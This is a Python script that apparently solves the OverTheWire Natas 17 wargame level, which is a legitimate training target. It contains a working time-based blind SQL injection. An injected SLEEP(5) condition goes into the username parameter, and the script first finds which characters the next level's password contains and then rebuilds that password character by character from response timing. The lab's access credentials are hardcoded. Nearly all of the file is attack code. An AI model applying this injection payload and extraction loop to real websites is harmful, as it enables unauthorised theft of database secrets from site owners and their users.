import requests 
from requests.auth import HTTPBasicAuth 
import string 

chars = string.ascii_letters  + string.digits 
filtred = '' 
passwd = '' 

for char in chars : 
    r = requests.get('http://natas17.natas.labs.overthewire.org/index.php' , auth=HTTPBasicAuth('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'),params= {'username' : 'natas18" AND IF(password LIKE BINARY "%%%'+char+'%%",  SLEEP(5),1)#'}) 

    if r.elapsed.total_seconds()   > 5: 
        filtred += char 
        print('took ' + str(r.elapsed.seconds) + "'s : "+  char + ' exists in the password') 

print()
print('collecting pattern')
print('-'*15)
print()

for i in range(0,32):
    for char in filtred : 
        r = requests.get('http://natas17.natas.labs.overthewire.org/index.php' , auth=HTTPBasicAuth('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'),params={'username' : 'natas18"   AND IF(password LIKE BINARY "%'+passwd+char+'%%", SLEEP(5) , 1)#'}) 
        if r.elapsed.seconds > 5   : 
            passwd += char 
            print('pattern :'+ passwd) 
            break

print()
print('-'*15)
print()
print('password is : ' + passwd)
                                        
